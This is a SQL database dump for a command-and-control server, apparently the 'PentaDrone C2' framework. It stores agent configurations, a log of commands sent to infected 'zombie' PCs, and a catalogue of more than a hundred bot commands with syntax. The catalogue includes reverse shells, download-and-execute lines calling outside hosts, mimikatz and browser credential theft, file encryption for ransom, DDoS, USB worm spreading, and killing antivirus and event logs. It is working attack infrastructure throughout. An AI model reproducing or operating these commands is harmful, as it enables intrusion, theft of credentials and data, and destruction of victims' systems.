/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET NAMES utf8 */;
/*!50503 SET NAMES utf8mb4 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;

CREATE TABLE IF NOT EXISTS `agent` (
  `id_agent` varchar(50) NOT NULL,
  `Commentaires` text,
  `file_conf` tinyblob NOT NULL,
  `operationpc_fk` varchar(50) NOT NULL,
  PRIMARY KEY (`id_agent`),
  KEY `operationpc_fk` (`operationpc_fk`),
  CONSTRAINT `operationpc_fk` FOREIGN KEY (`operationpc_fk`) REFERENCES `operationpc` (`ops_name`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

/*!40000 ALTER TABLE `agent` DISABLE KEYS */;
INSERT INTO `agent` (`id_agent`, `Commentaires`, `file_conf`, `operationpc_fk`) VALUES
	('Ag1', 'Comment1', _binary 0x5B67657443325D200D0A67657443323D68747470733A2F2F68747470733A2F2F706173746562696E2E636F6D2F7261772F78787878780D0A0D0A5B6B65797265616467657443325D200D0A6B65797265616467657443323D52514C6F687639434D76584D47456B5269332B46536C507546787A306E59725633507A4F734852684245383D0D0A0D0A5B726F6F74666F6C6465725D0D0A726F6F74666F6C6465723D7777770D0A0D0A5B6C696E6B666F6C6465725D0D0A6C696E6B666F6C6465723D6C696E6B0D0A0D0A5B6F70735D200D0A6F70733D44656661756C740D0A0D0A5B75706772616465707368656C6C5D200D0A75706772616465707368656C6C, 'Default'),
	('agTest', 'Agent op test', _binary 0x5B67657443325D200D0A67657443323D687474703A2F2F3137322E31382E3130312E36362F706E742F75692F63322E7478740D0A0D0A5B6B65797265616467657443325D200D0A6B65797265616467657443323D673045637566684D336C6E4A547852584E417A2F6F455268695830354A537A426A546B795155746D59734D3D0D0A0D0A5B726F6F74666F6C6465725D0D0A726F6F74666F6C6465723D706E740D0A0D0A5B6C696E6B666F6C6465725D0D0A6C696E6B666F6C6465723D6C696E6B0D0A0D0A5B6F70735D200D0A6F70733D44656661756C740D0A0D0A5B75706772616465707368656C6C5D200D0A75706772616465707368656C6C3D796573, 'test');
/*!40000 ALTER TABLE `agent` ENABLE KEYS */;

CREATE TABLE IF NOT EXISTS `category_cmd` (
  `category_name` varchar(20) NOT NULL,
  `syntaxe` varchar(250) NOT NULL,
  `id` int(11) DEFAULT NULL,
  PRIMARY KEY (`category_name`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

/*!40000 ALTER TABLE `category_cmd` DISABLE KEYS */;
INSERT INTO `category_cmd` (`category_name`, `syntaxe`, `id`) VALUES
	('Collection', 'The adversary is trying to gather data of interest to their goal.', 10),
	('Command and Control', 'The adversary is trying to communicate with compromised systems to control them.', 11),
	('Credential Access', 'The adversary is trying to steal account names and passwords.', 7),
	('Defense Evasion', 'The adversary is trying to avoid being detected.', 6),
	('Discovery', 'The adversary is trying to figure out your environment.', 8),
	('Execution', 'The adversary is trying to run malicious code.', 3),
	('Exfiltration', 'The adversary is trying to steal data.', 12),
	('Impact', 'The adversary is trying to manipulate, interrupt, or destroy your systems and data.', 13),
	('Initial Access', 'The adversary is trying to get into your network.', 2),
	('Lateral Movement', 'The adversary is trying to move through your environment.', 9),
	('Management', 'Manage agent for PentaDrone C2', 15),
	('Persistence', 'The adversary is trying to maintain their foothold.', 4),
	('Privilege Escalation', 'The adversary is trying to gain higher-level permissions.', 5),
	('Reconnaissance', 'The adversary is trying to gather information they can use to plan future operations.', 1),
	('Resource Development', 'The adversary is trying to establish resources they can use to support operations.', 14);
/*!40000 ALTER TABLE `category_cmd` ENABLE KEYS */;

CREATE TABLE IF NOT EXISTS `cmd_auto` (
  `id_cmdauto` int(11) NOT NULL AUTO_INCREMENT,
  `cmd_auto` varchar(250) NOT NULL,
  `operationpc_cmd_fk` varchar(50) NOT NULL,
  `ordre` int(11) NOT NULL,
  PRIMARY KEY (`id_cmdauto`),
  KEY `operationpc_cmd_fk` (`operationpc_cmd_fk`),
  CONSTRAINT `operationpc_cmd_fk` FOREIGN KEY (`operationpc_cmd_fk`) REFERENCES `operationpc` (`ops_name`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

/*!40000 ALTER TABLE `cmd_auto` DISABLE KEYS */;
INSERT INTO `cmd_auto` (`id_cmdauto`, `cmd_auto`, `operationpc_cmd_fk`, `ordre`) VALUES
	(1, '!run|0|calc', 'Default', 1),
	(2, '!run|1|calc', 'test', 1);
/*!40000 ALTER TABLE `cmd_auto` ENABLE KEYS */;

CREATE TABLE IF NOT EXISTS `commands` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `pc` varchar(100) NOT NULL,
  `cmd` tinytext NOT NULL,
  `result` text,
  `ok` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `pc` (`pc`),
  CONSTRAINT `pc` FOREIGN KEY (`pc`) REFERENCES `computer` (`pc`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

/*!40000 ALTER TABLE `commands` DISABLE KEYS */;
INSERT INTO `commands` (`id`, `pc`, `cmd`, `result`, `ok`) VALUES
	(1, '123456789', '!online', 'O\0n\0l\0i\0n\0e\0:\00\04\0/\02\01\0/\02\00\02\00\0 \01\07\0:\01\05\0:\04\02\0|\0A\0d\0m\0i\0n\0:\0|\0P\0r\0i\0v\0S\0h\0e\0l\0l\0:\0F\0a\0l\0s\0e\0|\0I\0d\0l\0e\0:\0L\0a\0s\0t\0 \0u\0s\0e\0r\0 \0k\0e\0y\0b\0o\0a\0r\0d\0/\0m\0o\0u\0s\0e\0 \0i\0n\0p\0u\0t\0:\0 \00\04\0/\02\01\0/\02\00\02\00\0 \00\05\0:\01\05\0 \0-\0-\0-\0-\0 \0P\0C\0 \0I\0d\0l\0e\0 \0f\0o\0r\0 \00\0 \0d\0a\0y\0s\0,\0 \00\0 \0h\0o\0u\0r\0s\0,\0 \00\0 \0m\0i\0n\0u\0t\0e\0s\0,\0 \00\0 \0s\0e\0c\0o\0n\0d\0s\0.\0', 1),
	(2, '123456789', '!run|1|calc', 'o?k?', 0),
	(3, '123123123', '!screenshot', ' \06\03\08\06\01\02\0.\0p\0n\0g\0.\0p\0n\0g\0', 1),
	(4, '123456789', '!extractlog|system', 'N\0e\0e\0d\0 \0s\0h\0e\0l\0l\0 \0w\0i\0t\0h\0 \0p\0r\0i\0v\0i\0l\0e\0g\0e\0s\0 \0-\0 \0t\0r\0y\0 \0p\0r\0i\0v\0e\0s\0c\0', 1),
	(5, '123456789', '!persist|reg', 'P\0E\0R\0S\0I\0T\0E\0N\0C\0E\0 \0-\0-\0-\0', 1),
	(6, '123123123', '!run|calc', 'dcdvknzdv zdk.png', 1);
/*!40000 ALTER TABLE `commands` ENABLE KEYS */;

CREATE TABLE IF NOT EXISTS `command_list` (
  `id_listcmd` int(11) NOT NULL AUTO_INCREMENT,
  `name_cmd` varchar(30) NOT NULL,
  `param` int(11) NOT NULL,
  `description` varchar(250) NOT NULL,
  `category_fk` varchar(20) NOT NULL,
  PRIMARY KEY (`id_listcmd`),
  KEY `category_fk` (`category_fk`),
  CONSTRAINT `category_fk` FOREIGN KEY (`category_fk`) REFERENCES `category_cmd` (`category_name`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

/*!40000 ALTER TABLE `command_list` DISABLE KEYS */;
INSERT INTO `command_list` (`id_listcmd`, `name_cmd`, `param`, `description`, `category_fk`) VALUES
	(1, '!quit', 0, ' !quit   -     Delete all artifacts and clean computer. The end of operations', 'Management'),
	(2, '!hello', 0, ' !hello   - Ping C2 server', 'Management'),
	(3, '!changec2', 1, ' !changec2|http:\\newc2cserver.com  -  switch C2 server', 'Management'),
	(4, '!beef', 2, ' !beef|iexplore.exe|http://192.168.3.40:3000/demos/basic.html   Param 2 can be: firefox.exe/ opera.exe/ chrome.exe/ iexplore.exe', 'Command and Control'),
	(5, '!speak', 1, ' !speak|you have been, hacked.', 'Impact'),
	(6, '!recon', 0, '!recon - Grab intelligence about victim environment (computers, networks, shares, security,...etc) ALWAYS use it FIRST', 'Discovery'),
	(7, '!update', 0, ' !update --    Update c2c and every others usefull stuff', 'Management'),
	(8, '!exfilfile', 1, ' !exfilfile|C:\\users\\secret.zip', 'Exfiltration'),
	(9, '!zip', 2, ' !zip|C:\\users\\public\\documents\\|C:\\users\\secret.zip', 'Collection'),
	(10, '!exfiltrate', 2, ' !exfiltrate|doc|C:\\users\\    ', 'Exfiltration'),
	(11, '!outlook', 0, ' !outlook        - List all pst archives', 'Collection'),
	(12, '!run', 2, ' !run|0|echo bonjour  -  !run|1|calc   - !run|2|net localgroup adminstrators1= yes run in job    0= no job ,     2= no job & upload results in txt', 'Execution'),
	(13, '!downexec', 3, '!downexec|ps1/exe|http://url.com/file|file -  example !downexec|ps1|http://script.com/Invoke-DBC2.ps1 |Invoke-DBC2 -Arguments    OR !downexec|exe|http://script.com/bin.exe |-i user -c pc', 'Execution'),
	(14, '!download', 2, ' !download|http://tools.hackarmoury.com/general_tools/nc/nc.exe|c:\\windows\\temp\\svchost.exe', 'Execution'),
	(15, '!url', 3, '!url|iexplore.exe|on / off|http://www.youtube.com/watch?v=dQw4w9WgXcQ', 'Impact'),
	(16, '!meterpreter', 2, ' !meterpreter|10.0.0.23|443', 'Execution'),
	(17, '!sleeps', 3, ' !sleeps|10|60|90', 'Management'),
	(18, '!thunder', 1, ' !thunder|http://www.youtube.com/watch?v=v2AC41dglnM', 'Impact'),
	(19, '!eicar', 0, ' !eicar      -    Triggering AV alarm', 'Management'),
	(20, '!nmap', 0, ' !nmap       -    Network port scanning like with Nmap, all over the LAN', 'Reconnaissance'),
	(21, '!wcry', 0, '  !wcry       -    Check system against WannaCry MS17-010 vulnerability', 'Reconnaissance'),
	(22, '!popup', 2, ' !popup|Administrative credentials are needed to install a pending update. You will be prompted shortly.|UPDATE PENDING', 'Impact'),
	(23, '!pivot', 0, ' !pivot     - download psexec, use credential and push bot in every ip in the LAN', 'Lateral Movement'),
	(24, '!psexec', 4, ' !psexec|domain\\admin|password|192.168.3.202|powershell.exe \'calc.exe\'    - download psexec, use credential and push bot in targeted ip ', 'Lateral Movement'),
	(25, '!pthsmb', 0, ' !pthsmb  - Pass the hash using SMB', 'Lateral Movement'),
	(26, '!pthwmi', 0, ' !pthwmi - Pass the hash using WMI', 'Lateral Movement'),
	(27, '!ntlmspoof', 0, ' !ntlmspoof   - Use inveigh to peform Spoofing attack and capture various password (SMB, NTLM, HTTP, WPAD ...)', 'Credential Access'),
	(28, '!webinject', 0, ' !webinject   - Use interceptor.ps1 to inject html content in every web request ', 'Execution'),
	(29, '!portfwd', 3, '!portfwd|33389|127.0.0.1|3389 -- Create a simple tcp port forward', 'Lateral Movement'),
	(30, '!socks', 1, '!socks|1234 -- Create a Socks 4/5 proxy on port 1234, configure your browser to use socks and browse in the context of this pc', 'Command and Control'),
	(31, '!ngrok', 3, '!ngrok|AUTHKEYAUTHKEY|http|80   - Expose zombie(TCP/IP) PC to Internet so that you can connect any tools', 'Execution'),
	(32, '!persist', 2, '!persist|reg / startup / task / wmi / all |Custom_command', 'Persistence'),
	(33, '!shellcode', 1, ' !shellcode|@(0x90,0x90,0xC3)   -  Inject the specifyed shellcode. msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed \'1,6d,s/[",]//g,s/\\\\/,0/g\' | tr -d \'\\n\' | cut -c2- ', 'Execution'),
	(34, '!usbspread', 2, ' !usbspread|on|YwBhAGwAYwA=     - Infect USB with malicious lnk', 'Persistence'),
	(35, '!wallpaper', 2, ' !wallpaper|http://wallpapercave.com/wp/ky43p3I.jpg/|c:\\windows\\temp\\1.jpg', 'Impact'),
	(36, '!webcam', 0, ' !webcam', 'Collection'),
	(37, '!screenshot', 0, ' !screenshot', 'Collection'),
	(38, '!geolocate', 0, '!geolocate -  Geolocate zombie using external API', 'Discovery'),
	(39, '!geolocategps', 0, '!geolocategps  -  Geolocate zombie using device GPS features, more precision.', 'Discovery'),
	(40, '!wshell', 1, ' !wshell|8080  -  use it with !tunnel to expose localhost port 8080 over Internet', 'Command and Control'),
	(41, '!jsrat', 1, ' !jsrat|192.168.10.96   Handle connexion with: powershell.exe -Exe Bypass -File c:\\test\\JSRat.ps1  & change listening IP ADDRESS in jsrat file', 'Command and Control'),
	(42, '!vnc', 4, ' !vnc|bind||5900|pass1234   OR  §vnc|reverse|IP_of_attacker|5500|pass1234', 'Command and Control'),
	(43, '!credential', 0, ' !credential  -  Try to Phish windows credentials and test it before storing it', 'Credential Access'),
	(44, '!keylog', 0, ' !keylog', 'Collection'),
	(45, '!hashdump', 0, ' !hashdump', 'Credential Access'),
	(46, '!remotemimikatz', 0, ' !remotemimikatz', 'Credential Access'),
	(47, '!mimikatz', 0, ' !mimikatz', 'Credential Access'),
	(48, '!clearevent', 0, ' !clearevent', 'Defense Evasion'),
	(49, '!logbypass', 0, '!logbypass    -   Invoke-phant0m  invisible mode activated against eventviewer', 'Defense Evasion'),
	(50, '!extractlog', 1, ' !extractlog|system', 'Collection'),
	(51, '!macattrib', 2, ' !macattrib|C:\\secret.txt|01/03/2006 12:12 pm', 'Defense Evasion'),
	(52, '!encrypt', 2, ' !encrypt|Q4dsd87rn1AE5@54fDER4584S2dZFj|C:\\users\\      Param 2 MUST ALWAYS END WITH "\\"    - encrypt all "doc,docx,xlx,xlsx,ppt,pptx,jpg,png,bmp,pdf,txt,log,mp3,avi,mpeg,mp4" files', 'Impact'),
	(53, '!decrypt', 2, ' !decrypt|Q4dsd87rn1AE5@54fDER4584S2dZFj|C:\\users\\', 'Impact'),
	(54, '!bitcoin', 0, ' !bitcoin Bitcoin mining, enslave the bot ,-)', 'Execution'),
	(55, '!dnsspoof', 2, ' !dnsspoof|127.0.0.1  facebook.com|0/1  --> 1 => add, 0 => clean & add', 'Execution'),
	(56, '!ddos', 1, ' !ddos|http://target.com', 'Impact'),
	(57, '!destroy', 0, ' !destroy the system', 'Impact'),
	(58, '!sendmail', 4, ' !sendmail|target@corp.com|subject|Hello Im your friend|c:\\evil.pdf    -  Send email from the compromised system', 'Initial Access'),
	(59, '!browserdump', 0, ' !browserdump  --  Dump browser passwords accounts', 'Credential Access'),
	(60, '!backdoorlnk', 0, '!backdoorlnk drop lnk backdoor', 'Persistence'),
	(61, '!bypassuac', 1, ' !bypassuac|powershell -exe bypass -win hidden -enc YwBhAGwAYwA=       - Bypass UAC and execute command in a privileged context.', 'Defense Evasion'),
	(62, '!sniff', 1, ' !sniff|10  - Capture TCP/IP packet - Open with Microsoft Message Analyzer', 'Discovery'),
	(63, '!killsysmon', 0, ' !killsysmon', 'Defense Evasion'),
	(64, '!worm', 2, ' !worm|login|password  - another way to move laterally but in a virally way', 'Persistence'),
	(65, '!runas', 1, '!runas|IEX(New-Object Net.WebClient).DownloadString("http://c2/link/pnt.ps1"))', 'Privilege Escalation'),
	(66, '!rdp', 0, '!rdp  -  Activate and start RDP service (expose it with ngrok and connect via Internet)', 'Lateral Movement'),
	(67, '!privesc', 0, '!privesc - Check local privesc vulnerabilities (sherlock  & powerUp)', 'Privilege Escalation'),
	(68, '!migrate', 0, ' !migrate     - Inject shellcode into the process ID (default = explorer) of your choosing or within the context of the running PowerShell process.', 'Privilege Escalation'),
	(69, '!procdump', 0, '!procdump    -  dump process - usefull to use offline mimikatz', 'Credential Access'),
	(70, '!firewall', 2, '!firewall|on / off|8080   - Desactivate or activate firewall and also specify a port to open in and out', 'Defense Evasion'),
	(71, '!http', 1, '!http|8080  -  setup local http server and host a page (Efficient if used with DNSSPOOF: you setup phishing page and you host redir.html To redirect local victim to your phishing page', 'Execution'),
	(72, '!phish', 2, '!phish|facebook.com|http://xxxxx.ngrok.io/facebook', 'Credential Access'),
	(73, '!reverseshell', 2, '!reverseshell|attackerIP|AttackerPort', 'Command and Control'),
	(74, '!httprat', 1, '!httprat|212.74.21.23  OR  !httprat|xxxxxx.ngrok.io   (without HTTP/s)', 'Command and Control'),
	(75, '!smbenum', 2, '!smbenum|toto|F8580EAGFH89725  -Enumarate Group,Sessions,Users,shares, need HASH', 'Discovery'),
	(76, '!enumsession', 2, '!enumsession|toto|F8580EAGFH89725 - Enumarate sessions, need HASH', 'Discovery'),
	(77, '!explorer', 2, '!explorer|1|  >only list share -   !explorer|0|C:\\users  >only list specified local folder  -  !explorer|1|C:\\users  >list shares and specified local folder ', 'Discovery'),
	(78, '!sherlock', 0, '!sherlock -  Detect Privesc vulns', 'Reconnaissance'),
	(79, '!bits', 2, '!bits|http://tools.com/nc.exe|c:\\windows\\temp\\svchost.exe', 'Execution'),
	(80, '!vector', 1, '!vector|SBOFSBOFSBOF==    Change the encoded string of payload vector', 'Management'),
	(81, '!getpid', 1, '!getpid|lsass -- Get the PID of a process', 'Discovery'),
	(82, '!whoami', 0, '!whoami - Display the current session user', 'Discovery'),
	(83, '!exfilonedriv', 0, '', 'Exfiltration'),
	(84, '!checkwmi', 0, '!checkwmi  --  Verify WMI value', 'Discovery'),
	(85, '!acl', 1, '!acl|c:\\users\\toto.txt    --   Get NTFS permissions applied to a file', 'Discovery'),
	(86, '!dropboxc2', 0, '!dropboxc2', 'Command and Control'),
	(87, '!streaming', 1, '!streaming|on / off - take screenshot at every hello (active spy)', 'Collection'),
	(88, '!choco', 0, ' !choco  - install Choco and some usefull plug', 'Management'),
	(89, '!aptget', 1, '!aptget|php OR !aptget|python2 OR !aptget|curl OR !aptget|wget - install package linux-like using CHOCOLATEY. You  must first run !choco', 'Management'),
	(90, '!pshupgrade', 0, ' !pshupgrade  --  upgrade powershell version', 'Management'),
	(91, '!windefkill', 1, ' !windefkill   OR !windefkill|10.10.10.2   -  Kill Windows Defender locally or remotely', 'Defense Evasion'),
	(92, '!extractkey', 2, '!extractkey OR remotely: !extractkey|domain\\admin|password  - Quietly digging up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP', 'Credential Access'),
	(93, '!nc', 1, '!nc|212.74.21.23  OR  !nc|xxxxxx.ngrok.io   - RUN BEFORE Server side: nc —v —l —p (port)', 'Command and Control'),
	(94, '!proxy', 2, ' !proxy|213.18.200.13|8484 - Set proxy configuration. you can use fiddler here to see HTTPS. or setup your own proxy ', 'Command and Control'),
	(95, '!hotpotatoes', 1, ' !hotpotatoes|net user tater Winter2016 /add && net localgroup administrators tater /add', 'Privilege Escalation'),
	(96, '!c2channel', 2, '!c2channel|gmail|http:\\\\server\\config.ini', 'Command and Control'),
	(97, '!adduser', 3, ' !adduser|johndoe|p@s5w0rd|domain', 'Persistence'),
	(98, '!bypassuac', 1, '!bypassuac|net user toto /add   OR !bypassuac', 'Privilege Escalation'),
	(99, '!wificreds', 1, '!wificreds|SSID_NAME - Extract stored WIFI credentials', 'Credential Access'),
	(100, '!webhistory', 0, '!webhistory  -  Get All browsers Navigation history', 'Discovery'),
	(101, '!getsystem', 0, '!getsystem - Try various privesc technic ', 'Privilege Escalation'),
	(102, '!pilot', 1, '!pilot|http://127.0.0.1/www/link/pilot.xml - Used to give a schema to zombies so that they will autopilot. How: they process the .xml file instructions, create and send to C2 the list of pré-formatted commands that they will execute ', 'Management'),
	(103, '!chromeextension', 1, ' !chromeextension|bhpijbhnnpcobofdieiocbphkdjjbef', 'Persistence'),
	(104, '!firefoxextension', 1, ' !firefoxextension|http://xxxx/ext.xpi', 'Persistence'),
	(105, '!vulnscan', 0, '!vulnscan   -    Vulnerabilities scanning like with Nessus (only local)', 'Reconnaissance'),
	(106, '!arpspoof', 0, '!arpspoof - Run MAC spoofing attack (MITM)', 'Collection'),
	(107, '!arp', 0, ' !arp  -  ping all the IP scope and return resulting arp cache (arp -a)', 'Reconnaissance'),
	(108, '!ps', 0, '!ps - list all running process', 'Discovery'),
	(109, '!netstat', 0, '!netstat - show open connexions', 'Discovery'),
	(110, '!amsibypass', 0, '!amsibypass', 'Defense Evasion');
/*!40000 ALTER TABLE `command_list` ENABLE KEYS */;

CREATE TABLE IF NOT EXISTS `computer` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `pc` varchar(100) NOT NULL,
  `hostname` varchar(50) NOT NULL,
  `ip` varchar(20) NOT NULL,
  `domain` varchar(250) NOT NULL,
  `ops_linked` varchar(50) NOT NULL DEFAULT 'Default',
  `obs` varchar(250) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `pc_2` (`pc`),
  KEY `ops_linked` (`ops_linked`),
  KEY `pc` (`pc`),
  CONSTRAINT `ops_linked` FOREIGN KEY (`ops_linked`) REFERENCES `operationpc` (`ops_name`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

/*!40000 ALTER TABLE `computer` DISABLE KEYS */;
INSERT INTO `computer` (`id`, `pc`, `hostname`, `ip`, `domain`, `ops_linked`, `obs`) VALUES
	(1, '123123123', 'pc1', '127.0.0.2', 'test.in', 'Default', 'good'),
	(3, '123456789', 'PC 2', '175.20.12.3', 'pmuc.cam', 'Ea', 'RAS');
/*!40000 ALTER TABLE `computer` ENABLE KEYS */;

CREATE TABLE IF NOT EXISTS `failed_jobs` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `connection` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `queue` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `exception` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*!40000 ALTER TABLE `failed_jobs` DISABLE KEYS */;
/*!40000 ALTER TABLE `failed_jobs` ENABLE KEYS */;

CREATE TABLE IF NOT EXISTS `migrations` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `migration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*!40000 ALTER TABLE `migrations` DISABLE KEYS */;
INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
	(2, '2014_10_12_100000_create_password_resets_table', 1),
	(3, '2019_08_19_000000_create_failed_jobs_table', 1),
	(6, '2014_10_12_000000_create_users_table', 1);
/*!40000 ALTER TABLE `migrations` ENABLE KEYS */;

CREATE TABLE IF NOT EXISTS `operationpc` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ops_name` varchar(50) NOT NULL,
  `description` varchar(100) NOT NULL,
  `etat_ops` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`),
  UNIQUE KEY `ops_name` (`ops_name`),
  UNIQUE KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

/*!40000 ALTER TABLE `operationpc` DISABLE KEYS */;
INSERT INTO `operationpc` (`id`, `ops_name`, `description`, `etat_ops`, `status`) VALUES
	(1, 'Default', 'Default Operation - DO NOT DELETE IT !', 1, 1),
	(2, 'Ea', 'Description', 1, 1),
	(6, 'test', 'test', 1, 1);
/*!40000 ALTER TABLE `operationpc` ENABLE KEYS */;

CREATE TABLE IF NOT EXISTS `password_resets` (
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  KEY `password_resets_email_index` (`email`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*!40000 ALTER TABLE `password_resets` DISABLE KEYS */;
INSERT INTO `password_resets` (`email`, `token`, `created_at`) VALUES
	('user@pnt.com', '$2y$10$6TplIXRkOhWh83r3JfC1HOFumBCG.a3I7ETRjDx3FhUB8DPZB9cJa', '2021-04-14 11:33:32');
/*!40000 ALTER TABLE `password_resets` ENABLE KEYS */;

CREATE TABLE IF NOT EXISTS `users` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `avatar` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'profil.png',
  `roles` bigint(20) NOT NULL DEFAULT '2',
  `user_description` text COLLATE utf8mb4_unicode_ci,
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_email_unique` (`email`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` (`id`, `name`, `email`, `email_verified_at`, `password`, `avatar`, `roles`, `user_description`, `remember_token`, `created_at`, `updated_at`) VALUES
	(1, 'admin', 'admin@pnt.com', NULL, '$2y$10$zGdyYC5sjnQsc1saWL/ghu1udzbztqHhhqlloiQ5swtPmzA14ISxW', 'profil.png', 1, NULL, NULL, '2021-04-14 11:38:12', '2021-04-14 11:38:12');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;

CREATE TABLE IF NOT EXISTS `user_roles` (
  `user_id` int(11) NOT NULL,
  `roles_name` varchar(255) NOT NULL,
  `permission_name` varchar(6) NOT NULL,
  PRIMARY KEY (`user_id`,`roles_name`,`permission_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

/*!40000 ALTER TABLE `user_roles` DISABLE KEYS */;
INSERT INTO `user_roles` (`user_id`, `roles_name`, `permission_name`) VALUES
	(1, 'admin', 'ALL'),
	(2, 'user', 'READ');
/*!40000 ALTER TABLE `user_roles` ENABLE KEYS */;

/*!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, '') */;
/*!40014 SET FOREIGN_KEY_CHECKS=IF(@OLD_FOREIGN_KEY_CHECKS IS NULL, 1, @OLD_FOREIGN_KEY_CHECKS) */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
